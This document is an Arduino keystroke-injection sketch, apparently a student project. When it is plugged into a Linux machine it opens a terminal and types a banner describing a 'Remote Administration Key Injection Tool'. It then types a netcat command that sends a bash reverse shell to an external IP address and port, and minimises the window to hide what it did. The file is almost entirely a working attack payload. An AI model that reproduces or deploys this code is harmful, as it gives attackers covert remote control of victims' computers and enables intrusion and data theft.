#include<Keyboard.h>
Keyboard kb;
uint8_t buf[8] = {
  0
};
boolean done;
void setup()
{
  Serial.begin(9600);
  done = false;
  delay(200);
}

void loop()
{
  if (!done) {
    kb.ALT_F2();
    kb.DELAY(500);
    kb.STRING("gnome-terminal");
    kb.DELAY(1500);
    kb.ENTER();
    kb.DELAY(2500);
    kb.STRING("clear");
    kb.ENTER();
    kb.STRING("sh");
    kb.ENTER();
    kb.STRING("################################################");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("##  Remote Administration Key Injection Tool  ##");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("################################################");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("######  Supported platforms and payloads  ######");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("####   @windows-powershell   @linux-netcat  ####");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("####   @macosx-netcat  @android,ios-netcat  ####");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("################################################");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("## @arduino @vpn_tunnel @netcat_port_mapping  ##");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("##            LINUX REVERSE SHELL             ##");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("################################################");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("#####  Done by  P.sridhar Final year CSE   #####");
    kb.ENTER();
    kb.DELAY(500);
    kb.STRING("################################################");
    kb.ENTER();
    kb.DELAY(300);
    kb.STRING("netcat 193.161.193.99 52408 -e ");
    sendKey(56);//
    kb.STRING("bin");
    sendKey(56);//
    kb.STRING("bash");
    kb.ENTER();
    kb.DELAY(2000);
    kb.ALT_SPACE();
    kb.DELAY(1500);
    kb.STRING("n");
    done = true;
  }
}

void releaseKey()
{
  buf[0] = 0;
  buf[2] = 0;
  Serial.write(buf, 8);
}

void sendKey(int keyNum) {
  buf[2] = keyNum;
  Serial.write(buf, 8);
  releaseKey();
}
